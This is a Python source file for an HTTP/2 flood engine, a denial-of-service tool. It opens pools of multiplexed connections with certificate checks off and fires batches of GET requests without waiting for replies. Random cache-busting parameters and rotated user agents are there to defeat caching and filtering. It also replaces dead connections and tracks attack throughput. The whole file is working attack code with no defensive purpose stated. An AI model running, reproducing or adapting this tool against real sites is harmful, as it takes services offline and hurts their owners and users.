"""
HTTP/2 Multiplexed Flood Engine
=================================
Pure Python HTTP/2 flood using h2 library.
Bypasses HTTP/1.1 connection limits via h2 multiplexing (128+ streams/conn).
Fire-and-forget: sends HEADERS frames without waiting for responses.

Architecture:
  - Manages a pool of h2 connections (default 5-20)
  - Each connection opens max_concurrent_streams (typically 128) streams
  - Sends minimal GET request headers per stream
  - When stream limit reached, reuses connection for new streams
  - Self-healing: dead connections are replaced
"""
from __future__ import annotations

import asyncio
import logging
import random
import socket
import ssl
import sys
import threading
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse

logger = logging.getLogger("h2_flood_engine")

try:
    import h2.connection
    import h2.events
    import h2.config
    import h2.exceptions
    import h2.settings
    HAS_H2 = True
except ImportError:
    HAS_H2 = False

PATH_PATTERNS = [
    "/", "/index.php", "/index.html", "/wp-login.php",
    "/wp-admin/admin-ajax.php", "/xmlrpc.php", "/api/v1",
    "/api/v2", "/api/status", "/api/health",
    "/login", "/admin", "/search", "/contact",
    "/about", "/blog", "/post", "/page",
    "/download", "/upload", "/files", "/assets",
    "/robots.txt", "/sitemap.xml", "/favicon.ico",
    "/.env", "/.git/config", "/server-status",
    "/cgi-bin", "/cgi-bin/status",
]

CHARS = "abcdefghijklmnopqrstuvwxyz0123456789"

UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
]


@dataclass
class H2Metrics:
    sent: int = 0
    failed: int = 0
    timeout: int = 0
    bytes_sent: int = 0
    started_at: float = field(default_factory=time.time)

    @property
    def total(self) -> int:
        return self.sent + self.failed + self.timeout

    def actual_rps(self) -> float:
        elapsed = max(1e-6, time.time() - self.started_at)
        return self.sent / elapsed


class H2Connection:
    """
    Single HTTP/2 connection with multiplexed streams.
    Sends fire-and-forget HEADERS frames.
    """

    def __init__(self, host: str, port: int, is_ssl: bool,
                 host_header: Optional[str] = None,
                 max_streams: int = 128):
        self.host = host
        self.port = port
        self.is_ssl = is_ssl
        self.host_header = host_header or host
        self.max_streams = max_streams
        self.sock: Optional[socket.socket] = None
        self.ssl_sock: Optional[ssl.SSLSocket] = None
        self.conn: Any = None
        self.alive = False
        self.next_stream_id = 1
        self.active_streams = 0

    def open(self, timeout: float = 10.0) -> bool:
        if not HAS_H2:
            return False
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(["h2", "http/1.1"])

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            try:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            except OSError:
                pass
            try:
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            except OSError:
                pass
            sock.settimeout(timeout)
            sock.connect((self.host, self.port))

            ssl_sock = ctx.wrap_socket(sock, server_hostname=self.host_header)
            alpn = ssl_sock.selected_alpn_protocol()
            if alpn != "h2":
                ssl_sock.close()
                return False

            config = h2.config.H2Configuration(
                client_side=True,
                header_encoding="utf-8",
            )
            conn = h2.connection.H2Connection(config=config)
            conn.initiate_connection()
            ssl_sock.sendall(conn.data_to_send())

            # Receive server SETTINGS
            data = ssl_sock.recv(65535)
            if data:
                events = conn.receive_data(data)
                for ev in events:
                    if isinstance(ev, h2.events.RemoteSettingsChanged):
                        ms = ev.changed_settings.get(h2.settings.SettingCodes.MAX_CONCURRENT_STREAMS)
                        if ms:
                            self.max_streams = ms.new_value
                    elif isinstance(ev, h2.events.WindowUpdated):
                        pass
                # Send SETTINGS ACK
                ssl_sock.sendall(conn.data_to_send())

            self.sock = sock
            self.ssl_sock = ssl_sock
            self.conn = conn
            self.alive = True
            self.next_stream_id = 1
            self.active_streams = 0
            return True
        except Exception as e:
            logger.debug("[h2conn] open %s:%d failed: %s", self.host, self.port, e)
            return False

    def send_request(self) -> bool:
        """Send one HEADERS frame with END_STREAM. Returns True on success."""
        if not self.alive or not self.conn:
            return False
        try:
            stream_id = self.next_stream_id
            self.next_stream_id += 2

            path = PATH_PATTERNS[random.randint(0, len(PATH_PATTERNS) - 1)]
            ua = UA_POOL[random.randint(0, len(UA_POOL) - 1)]
            cache_buster = f"?_{random.randint(0, 99999999)}&t={int(time.time() * 1000)}"

            headers = [
                (":method", "GET"),
                (":path", path + cache_buster),
                (":authority", self.host_header),
                (":scheme", "https"),
                ("user-agent", ua),
                ("accept", "*/*"),
                ("cache-control", "no-cache"),
                ("accept-language", "en-US,en;q=0.9"),
            ]

            self.conn.send_headers(stream_id, headers, end_stream=True)
            self.ssl_sock.sendall(self.conn.data_to_send())
            self.active_streams += 1
            return True
        except (h2.exceptions.StreamClosedError,
                h2.exceptions.ProtocolError,
                BrokenPipeError, ConnectionResetError,
                OSError, AttributeError):
            self.alive = False
            return False
        except Exception:
            self.alive = False
            return False

    def recv_and_process(self) -> int:
        """Process incoming frames. Max 1 recv call, returns immediately."""
        if not self.alive or not self.ssl_sock or not self.conn:
            return 0
        completed = 0
        try:
            self.ssl_sock.settimeout(0.0005)
            data = self.ssl_sock.recv(65535)
            if not data:
                self.alive = False
                return 0
            events = self.conn.receive_data(data)
            for ev in events:
                if isinstance(ev, (h2.events.StreamEnded,
                                  h2.events.DataReceived,
                                  h2.events.ResponseReceived)):
                    completed += 1
                    self.active_streams = max(0, self.active_streams - 1)
                elif isinstance(ev, h2.events.StreamReset):
                    completed += 1
                    self.active_streams = max(0, self.active_streams - 1)
            extra = self.conn.data_to_send()
            if extra:
                self.ssl_sock.sendall(extra)
        except socket.timeout:
            pass
        except (BrokenPipeError, ConnectionResetError, OSError):
            self.alive = False
        except Exception:
            self.alive = False
        return completed

    def close(self):
        self.alive = False
        if self.conn:
            try:
                self.conn.close_connection()
                if self.ssl_sock:
                    self.ssl_sock.sendall(self.conn.data_to_send())
            except Exception:
                pass
        if self.ssl_sock:
            try:
                self.ssl_sock.close()
            except Exception:
                pass
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass


class H2FloodWorker:
    """
    H2 Flood Worker - manages multiple h2 connections and pumps streams.
    Runs in its own asyncio loop inside a thread.
    """

    def __init__(
        self,
        target_url: str,
        duration_seconds: float,
        target_rps: int,
        worker_id: int,
        stats_queue,
        stop_event,
        proxy_urls: Optional[List[str]] = None,
        host_header: Optional[str] = None,
        connections: int = 5,
    ):
        parsed = urlparse(target_url)
        self.host = parsed.hostname or parsed.netloc.split(":")[0]
        self.port = parsed.port or (443 if parsed.scheme == "https" else 80)
        self.is_ssl = parsed.scheme == "https"
        self.host_header = host_header or self.host
        self.duration_seconds = float(duration_seconds)
        self.target_rps = max(100, target_rps)
        self.worker_id = worker_id
        self.stats_queue = stats_queue
        self.stop_event = stop_event
        self.proxy_urls = proxy_urls or []
        self.connections = max(3, min(20, connections))

        self.metrics = H2Metrics()
        self.metrics.started_at = time.time()
        self._last_report = time.time()
        self._last_sent = 0
        self._connecting = False

    def _push_stats(self, force: bool = False):
        now = time.time()
        if not force and (now - self._last_report) < 0.25:
            return
        elapsed = max(1e-6, now - self.metrics.started_at)
        instant_rps = (self.metrics.sent - self._last_sent) / max(1e-6, now - self._last_report)
        snapshot = {
            "worker_id": self.worker_id,
            "ts": now,
            "sent": self.metrics.sent,
            "failed": self.metrics.failed,
            "timeout": self.metrics.timeout,
            "bytes_sent": self.metrics.bytes_sent,
            "instant_rps": instant_rps,
            "avg_rps": self.metrics.sent / elapsed if elapsed else 0,
            "elapsed": elapsed,
        }
        try:
            self.stats_queue.put_nowait(snapshot)
        except Exception:
            try:
                self.stats_queue.get_nowait()
                self.stats_queue.put_nowait(snapshot)
            except Exception:
                pass
        self._last_report = now
        self._last_sent = self.metrics.sent

    async def run(self) -> H2Metrics:
        """Main attack loop - aggressive fire-and-forget with rotation."""
        if not HAS_H2:
            logger.error("[h2w%d] h2 library not installed", self.worker_id)
            self.metrics.failed += 1
            return self.metrics

        pool: List[H2Connection] = []
        start = time.time()
        loop = asyncio.get_event_loop()
        full_count = {}  # conn -> consecutive full cycles
        max_pool = max(10, self.connections * 2)

        try:
            while not self.stop_event.is_set():
                elapsed = time.time() - start
                if elapsed >= self.duration_seconds:
                    break

                # Aggressive replenish
                pool = [c for c in pool if c.alive]
                if len(pool) < max_pool:
                    need = min(max_pool - len(pool), 5)
                    opens = []
                    for _ in range(need):
                        c = H2Connection(self.host, self.port, self.is_ssl,
                                         host_header=self.host_header)
                        opens.append(c)
                    if opens:
                        results = await asyncio.gather(*[
                            loop.run_in_executor(None, c.open, 6.0) for c in opens
                        ], return_exceptions=True)
                        for c, ok in zip(opens, results):
                            if ok is True and c.alive:
                                pool.append(c)

                # Phase 1: drain + send on each connection
                for conn in pool:
                    if not conn.alive:
                        continue

                    # Drain
                    if conn.active_streams > 0:
                        await loop.run_in_executor(None, conn.recv_and_process)

                    # Send if slots available
                    avail = conn.max_streams - conn.active_streams
                    if avail <= 0:
                        full_count[conn] = full_count.get(conn, 0) + 1
                        continue
                    full_count[conn] = 0

                    # Send batch
                    batch = min(avail, 64)
                    sent_ok = 0
                    for req_i in range(batch):
                        try:
                            sid = conn.next_stream_id
                            conn.next_stream_id += 2
                            conn.conn.send_headers(sid, [
                                (":method", "GET"),
                                (":path", PATH_PATTERNS[random.randint(0, len(PATH_PATTERNS)-1)]
                                         + f"?_{random.randint(0,999999)}"),
                                (":authority", conn.host_header),
                                (":scheme", "https"),
                                ("user-agent", UA_POOL[random.randint(0, len(UA_POOL)-1)]),
                                ("accept", "*/*"),
                            ], end_stream=True)
                            conn.active_streams += 1
                            sent_ok += 1
                        except Exception:
                            conn.alive = False
                            break
                    self.metrics.sent += sent_ok
                    self.metrics.failed += (batch - sent_ok)

                    # Flush
                    if conn.alive:
                        try:
                            data = conn.conn.data_to_send()
                            if data:
                                conn.ssl_sock.sendall(data)
                        except (BrokenPipeError, ConnectionResetError, OSError):
                            conn.alive = False

                # Phase 2: recycle connections stuck full for 5+ cycles
                dead = []
                for conn, count in list(full_count.items()):
                    if count >= 5 and conn in pool:
                        conn.close()
                        dead.append(conn)
                for conn in dead:
                    if conn in pool:
                        pool.remove(conn)
                    full_count.pop(conn, None)
                # Also clean dead entries
                full_count = {c: v for c, v in full_count.items() if c in pool}

                await asyncio.sleep(0)
                self._push_stats(force=False)

        finally:
            for c in pool:
                try: c.close()
                except: pass
            self._push_stats(force=True)

        return self.metrics


def run_h2_worker_in_thread(
    target_url: str,
    target_rps: int,
    duration_seconds: float,
    worker_id: int,
    stats_queue,
    stop_event,
    proxy_urls: Optional[List[str]] = None,
    host_header: Optional[str] = None,
    connections: int = 5,
    result_dict: Optional[dict] = None,
) -> None:
    """Thread entry point for h2 flood worker."""
    if sys.platform == "win32":
        try:
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        except Exception:
            pass

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    worker = H2FloodWorker(
        target_url=target_url,
        duration_seconds=duration_seconds,
        target_rps=target_rps,
        worker_id=worker_id,
        stats_queue=stats_queue,
        stop_event=stop_event,
        proxy_urls=proxy_urls,
        host_header=host_header,
        connections=connections,
    )

    try:
        metrics = loop.run_until_complete(worker.run())
        if result_dict is not None:
            result_dict["sent"] = metrics.sent
            result_dict["failed"] = metrics.failed
            result_dict["timeout"] = metrics.timeout
            result_dict["bytes_sent"] = metrics.bytes_sent
            result_dict["actual_rps"] = metrics.actual_rps()
    except Exception as e:
        logger.error("[h2 worker %d] fatal: %s", worker_id, e)
        if result_dict is not None:
            result_dict["error"] = str(e)
    finally:
        try:
            pending = asyncio.all_tasks(loop)
            for t in pending:
                t.cancel()
            loop.run_until_complete(asyncio.gather(*pending, return_exceptions=True))
        except Exception:
            pass
        try:
            loop.close()
        except Exception:
            pass
